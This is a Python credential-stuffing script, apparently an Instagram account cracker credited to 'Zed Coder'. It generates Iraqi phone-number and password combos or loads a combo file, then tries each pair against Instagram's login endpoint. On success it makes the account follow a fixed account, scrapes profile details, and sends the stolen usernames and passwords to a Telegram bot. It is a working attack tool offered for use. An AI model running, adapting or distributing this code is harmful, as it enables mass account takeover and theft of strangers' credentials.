#
#bo chak krdni
#
#am pip ana install bka 
#
#requests
#
#user_agent
#
#bs4
#
#
#
#agar ios hape bgare la youtube bzana pythonista ean harshte ka ba kari deni to pip chon install daka
#
#
#
#############################################################################################################
try:
	import  sys, os, random, time, user_agent
	import os,sys
	import subprocess
	from bs4 import BeautifulSoup
	import json, requests, os, sys, time, datetime
	import requests
	from datetime import datetime
except:
	import requests as r
	os.system("pip3 install requests")
	os.system("pip3 install bs4")
	os.system("pip3 install user_agent")
	try:
		import pip
		pip.install("requests")
		pip.install("bs4")
		pip.install("user_agent")
	except:
		pass
	pass
os.system("rm -rf combo.txt")
try:os.remove("combo.txt")
except:pass
if os.name=='nt':oss="cls"
else:oss="clear"
try:os.system("combo.txt")
except:pass
if os.name=='nt':os.system("start https://t.me/zed_cracker_1")
else:os.system("xdg-open https://t.me/zed_cracker_1")
os.system(oss)
os.system(oss)

logo1='''

 __________            .__               
 \______   \____  _____|__| ____   ____  
 |     ___/  _ \/  ___/  |/  _ \ /     \ 
 |    |  (  <_> )___ \|  (  <_> )   | \ 
 |____|   \____/____  >__|\____/|___|  \/

 -------------------------------------------
   Author   : Zed Coder
    GitHub   : https://github.com/968hacker
    YouTube  : Zed cracker
    telegram : https://t.me/zed_cracker_1
 -------------------------------------------'''
logo2='''

 __________            .__               
 \______   \____  _____|__| ____   ____  
 |     ___/  _ \/  ___/  |/  _ \ /     \ 
 |    |  (  <_> )___ \|  (  <_> )   | \ 
 |____|   \____/____  >__|\____/|___|  \/

 -------------------------------------------
   Author   : Zed Coder
    GitHub   : https://github.com/968hacker
    YouTube  : Zed cracker
    telegram : https://t.me/zed_cracker_1
 -------------------------------------------

 -------------------------------------------
	Crack instgram it started !
  please wait .. 1h or 2h 
   Prosess in Background !...... 
 -------------------------------------------

 -------------------------------------------
'''
print(logo1)
print(" \n Agar Nazani La Telegram  \n  Bnwsa @myidbot Lawe Dary Bena ")
ID=input(" \n ID Chat y Telegram y Xot Dabne :")
print(" \n Agar Nazani Token y BOT Beni  \n  Bnwsa @botfather Lawe Dary Bena ")
token=input(" \n Token ( BOT ) : ")
def lwla():
	global ID, token 
	bad=0
	timeout=0
	hits=0
	checkpoint=0
	error=0
	kill=0
	tesed=0
	print("\n Datawe Xoy Combo Daxl Bkat Bnwsa 1\n Agar Datawe Xot Daxli Bkait Bnwsa 2")
	filee=input("\n -?!: ")
	if filee=="1":
		os.system(oss)
		def sp():
			for lol in range(2500):
				s=random.randint(1000000, 9999999)
				ss=("+964770"+str(s)+":0770"+str(s))
				with open("combo.txt", "a") as bo:
					bo.write(str(ss)+"\n")
				so=random.randint(1000000, 9999999)
				sos=("+964771"+str(so)+":0771"+str(so))
				with open("combo.txt", "a") as bo:
					bo.write(str(sos)+"\n")
				sk=random.randint(1000000, 9999999)
				sks=("+964750"+str(sk)+":0750"+str(sk))
				with open("combo.txt", "a") as bo:
					bo.write(str(sks)+"\n")
				sl=random.randint(1000000, 9999999)
				ssl=("+964751"+str(sl)+":0751"+str(sl))
				with open("combo.txt", "a") as bo:
					bo.write(str(ssl)+"\n")
		sp()
		filo="combo.txt"
		file=open(filo,"r").read().splitlines()
		for line in file:
			user=line.split(':')[0]
			pasw=line.split(':')[1]
			url = 'https://www.instagram.com/accounts/login/ajax/'
			head = {'accept':'*/*','accept-encoding':'gzip,deflate,br','accept-language':'en-US,en;q=0.9,ar;q=0.8','content-length':'269','content-type':'application/x-www-form-urlencoded','cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent': user_agent.generate_user_agent(),'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'8a8118fa7d40','x-requested-with':'XMLHttpRequest'}
			time_now = int(datetime.now().timestamp())
			data = {'username': user,'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+str(pasw),'queryParams': {},'optIntoOneTap': 'false',}
			try:
				login = requests.post(url,headers=head,data=data,allow_redirects=True,verify=True)
				import time
				time.sleep(3)
				if '"authenticated":false' in login.text:
					os.system(oss)
					print(logo2)
					bad+=1
					tesed+=1
					print(f'  [T]otal : 12501\n    [^] Tested : '+str(tesed)+'\n    [+] Good : '+str(hits)+' \n    [-] Checkpoint : '+str(checkpoint)+' \n    [-] Bad : '+str(bad)+' \n    [=] timeout : '+str(timeout)+' \n    [-] Error : '+str(error)+'\n   [-] Kill : '+str(kill)+'\n\n -------------------------------------------\n')
				elif '"message":"Please wait a few minutes before you try again."' in login.text:
					os.system(oss)
					print(logo2)
					timeout+=1
					import time
					tesed+=1
					print(f'  [T]otal : 12501\n    [^] Tested : '+str(tesed)+'\n    [+] Good : '+str(hits)+' \n    [-] Checkpoint : '+str(checkpoint)+' \n    [-] Bad : '+str(bad)+' \n    [=] timeout : '+str(timeout)+' \n    [-] Error : '+str(error)+'\n   [-] Kill : '+str(kill)+'\n\n -------------------------------------------\n')
					time.sleep(30)
				elif 'userId' or '"authenticated":true' in login.text:
					cook = login.cookies['sessionid']
					hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/_papulakam__0/follow/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': user_agent.generate_user_agent(),'x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest'}
					data_get_info = {'__a': '1'}
					urll = 'https://www.instagram.com/web/friendships/44727257007/follow/'
					try:requests.post(urll,headers=hedDLT)
					except:pass
					headers_get_info = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=Zc4tm5D7QNL1hiMGJ1caLT7DNPTYHqH0; ds_user_id=45334757205; sessionid='+str(cook)+'; rur=VLL','referer': 'https://www.instagram.com/accounts/edit/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','User-Agent': user_agent.generate_user_agent(),'x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl','x-requested-with': 'XMLHttpRequest'}
					url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
					req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
					usernm = str(req_get_info.json()['form_data']['username'])
					url = f"https://www.instagram.com/{usernm}?hl=en"
					r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
					soup = BeautifulSoup(r,'html.parser')
					meta = soup.find("meta")
					name = soup.find("meta", property="og:title")
					name = name["content"].split("(")[0]
					description = soup.find("meta", property="og:description")
					followers = description["content"].split(",")[0]
					following = description["content"].split(",")[1]
					posts = description["content"].split(",")[2].split("-")[0]
					name = str(req_get_info.json()['form_data']['first_name'])
					os.system(oss)
					boooom=("GOOD: "+user+":"+pasw+"\nName: "+name+"\nFollowers: "+followers+"\nfollowing: "+following+"\nPost: "+posts)
					hits+=1
					tesed+=1
					print(str(logo2)+'  [T]otal : 12501\n    [^] Tested : '+str(tesed)+'\n    [+] Good : '+str(hits)+' \n    [-] Checkpoint : '+str(checkpoint)+' \n    [-] Bad : '+str(bad)+' \n    [=] timeout : '+str(timeout)+' \n    [-] Error : '+str(error)+'\n   [-] Kill : '+str(kill)+'\n\n -------------------------------------------\n')
					requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
					if os.name=="posix":
						with open('/sdcard/GOOD.txt', 'a') as ff:
							ff.write(f"\nGOOD: "+user+":"+pasw+"\nName: "+name+"\nFollowers: "+followers+"\nfollowing: "+following+"\nPost: "+posts+"\n")
					else:
						with open('GOOD.txt', 'a') as ff:
							ff.write(f"\nGOOD: "+user+":"+pasw+"\nName: "+name+"\nFollowers: "+followers+"\nfollowing: "+following+"\nPost: "+posts+"\n")
				elif ('"message":"checkpoint_required"') in login.text:
					os.system(oss)
					print(logo2)
					checkpoint+=1
					tesed+=1
					boooomm=("CHK: "+user+":"+pasw)
					print(f'  [T]otal : 12501\n    [^] Tested : '+str(tesed)+'\n    [+] Good : '+str(hits)+' \n    [-] Checkpoint : '+str(checkpoint)+' \n    [-] Bad : '+str(bad)+' \n    [=] timeout : '+str(timeout)+' \n    [-] Error : '+str(error)+'\n   [-] Kill : '+str(kill)+'\n\n -------------------------------------------\n')
					requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooomm}\n')
					if os.name=="posix":
						with open('/sdcard/CHK.txt', 'a') as ff:
							ff.write(f"\nCHK: "+user+":"+pasw)
					else:
						with open('CHK.txt', 'a') as ff:
							ff.write(f"\nCHK: "+user+":"+pasw)
				else:
					os.system(oss)
					print(logo2)
					error+=1
					tesed+=1
					print(f'  [T]otal : 12501\n    [^] Tested : '+str(tesed)+'\n    [+] Good : '+str(hits)+' \n    [-] Checkpoint : '+str(checkpoint)+' \n    [-] Bad : '+str(bad)+' \n    [=] timeout : '+str(timeout)+' \n    [-] Error : '+str(error)+'\n   [-] Kill : '+str(kill)+'\n\n -------------------------------------------\n')
			except:
				os.system(oss)
				print(logo2)
				kill+=1
				tesed+=1
				print(f'  [T]otal : 12501\n    [^] Tested : '+str(tesed)+'\n    [+] Good : '+str(hits)+' \n    [-] Checkpoint : '+str(checkpoint)+' \n    [-] Bad : '+str(bad)+' \n    [=] timeout : '+str(timeout)+' \n    [-] Error : '+str(error)+'\n   [-] Kill : '+str(kill)+'\n\n -------------------------------------------\n')
	elif filee=="2":
		os.system(oss)
		try:
			filo=input(' Path File : ')
		except:
			print("\n halat krd !!!!!!!!!")
			os.sys.exit()
		file=open(filo,"r").read().splitlines()
		for line in file:
			user=line.split(':')[0]
			pasw=line.split(':')[1]
			url = 'https://www.instagram.com/accounts/login/ajax/'
			head = {'accept':'*/*','accept-encoding':'gzip,deflate,br','accept-language':'en-US,en;q=0.9,ar;q=0.8','content-length':'269','content-type':'application/x-www-form-urlencoded','cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent': user_agent.generate_user_agent(),'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'8a8118fa7d40','x-requested-with':'XMLHttpRequest'}
			time_now = int(datetime.now().timestamp())
			urll = 'https://www.instagram.com/web/friendships/44727257007/follow/'
			data = {'username': user,'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+str(pasw),'queryParams': {},'optIntoOneTap': 'false',}
			try:
				login = requests.post(url,headers=head,data=data,allow_redirects=True,verify=True)
				import time
				time.sleep(3)
				if '"authenticated":false' in login.text:
					os.system(oss)
					print(logo2)
					bad+=1
					tesed+=1
					print(f'  [T]otal : 12501\n    [^] Tested : '+str(tesed)+'\n    [+] Good : '+str(hits)+' \n    [-] Checkpoint : '+str(checkpoint)+' \n    [-] Bad : '+str(bad)+' \n    [=] timeout : '+str(timeout)+' \n    [-] Error : '+str(error)+'\n   [-] Kill : '+str(kill)+'\n\n -------------------------------------------\n')
				elif '"message":"Please wait a few minutes before you try again."' in login.text:
					os.system(oss)
					print(logo2)
					timeout+=1
					import time
					tesed+=1
					print(f'  [T]otal : 12501\n    [^] Tested : '+str(tesed)+'\n    [+] Good : '+str(hits)+' \n    [-] Checkpoint : '+str(checkpoint)+' \n    [-] Bad : '+str(bad)+' \n    [=] timeout : '+str(timeout)+' \n    [-] Error : '+str(error)+'\n   [-] Kill : '+str(kill)+'\n\n -------------------------------------------\n')
					time.sleep(30)
				elif 'userId' or '"authenticated":true' in login.text:
					cook = login.cookies['sessionid']
					hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/_papulakam__0/follow/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': user_agent.generate_user_agent(),'x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest'}
					data_get_info = {'__a': '1'}
					urll = 'https://www.instagram.com/web/friendships/44727257007/follow/'
					try:requests.post(urll,headers=hedDLT)
					except:pass
					headers_get_info = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=Zc4tm5D7QNL1hiMGJ1caLT7DNPTYHqH0; ds_user_id=45334757205; sessionid='+str(cook)+'; rur=VLL','referer': 'https://www.instagram.com/accounts/edit/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','User-Agent': user_agent.generate_user_agent(),'x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl','x-requested-with': 'XMLHttpRequest'}
					url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
					req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
					usernm = str(req_get_info.json()['form_data']['username'])
					url = f"https://www.instagram.com/{usernm}?hl=en"
					r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
					soup = BeautifulSoup(r,'html.parser')
					meta = soup.find("meta")
					name = soup.find("meta", property="og:title")
					name = name["content"].split("(")[0]
					description = soup.find("meta", property="og:description")
					followers = description["content"].split(",")[0]
					following = description["content"].split(",")[1]
					posts = description["content"].split(",")[2].split("-")[0]
					name = str(req_get_info.json()['form_data']['first_name'])
					os.system(oss)
					boooom=("GOOD: "+user+":"+pasw+"\nName: "+name+"\nFollowers: "+followers+"\nfollowing: "+following+"\nPost: "+posts)
					hits+=1
					tesed+=1
					print(str(logo2)+'  [T]otal : 12501\n    [^] Tested : '+str(tesed)+'\n    [+] Good : '+str(hits)+' \n    [-] Checkpoint : '+str(checkpoint)+' \n    [-] Bad : '+str(bad)+' \n    [=] timeout : '+str(timeout)+' \n    [-] Error : '+str(error)+'\n   [-] Kill : '+str(kill)+'\n\n -------------------------------------------\n')
					requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
					if os.name=="posix":
						with open('/sdcard/GOOD.txt', 'a') as ff:
							ff.write(f"\nGOOD: "+user+":"+pasw+"\nName: "+name+"\nFollowers: "+followers+"\nfollowing: "+following+"\nPost: "+posts+"\n")
					else:
						with open('GOOD.txt', 'a') as ff:
							ff.write(f"\nGOOD: "+user+":"+pasw+"\nName: "+name+"\nFollowers: "+followers+"\nfollowing: "+following+"\nPost: "+posts+"\n")
				elif ('"message":"checkpoint_required"') in login.text:
					os.system(oss)
					print(logo2)
					checkpoint+=1
					tesed+=1
					boooomm=("CHK: "+user+":"+pasw)
					print(f'  [T]otal : 12501\n    [^] Tested : '+str(tesed)+'\n    [+] Good : '+str(hits)+' \n    [-] Checkpoint : '+str(checkpoint)+' \n    [-] Bad : '+str(bad)+' \n    [=] timeout : '+str(timeout)+' \n    [-] Error : '+str(error)+'\n   [-] Kill : '+str(kill)+'\n\n -------------------------------------------\n')
					requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooomm}\n')
					if os.name=="posix":
						with open('/sdcard/CHK.txt', 'a') as ff:
							ff.write(f"\nCHK: "+user+":"+pasw)
					else:
						with open('CHK.txt', 'a') as ff:
							ff.write(f"\nCHK: "+user+":"+pasw)
				else:
					os.system(oss)
					print(logo2)
					error+=1
					tesed+=1
					print(f'  [T]otal : 12501\n    [^] Tested : '+str(tesed)+'\n    [+] Good : '+str(hits)+' \n    [-] Checkpoint : '+str(checkpoint)+' \n    [-] Bad : '+str(bad)+' \n    [=] timeout : '+str(timeout)+' \n    [-] Error : '+str(error)+'\n   [-] Kill : '+str(kill)+'\n\n -------------------------------------------\n')
			except:
				os.system(oss)
				print(logo2)
				tesed+=1
				kill+=1
				print(f'  [T]otal : 12501\n    [^] Tested : '+str(tesed)+'\n    [+] Good : '+str(hits)+' \n    [-] Checkpoint : '+str(checkpoint)+' \n    [-] Bad : '+str(bad)+' \n    [=] timeout : '+str(timeout)+' \n    [-] Error : '+str(error)+'\n   [-] Kill : '+str(kill)+'\n\n -------------------------------------------\n')
	else:lwla()
lwla()

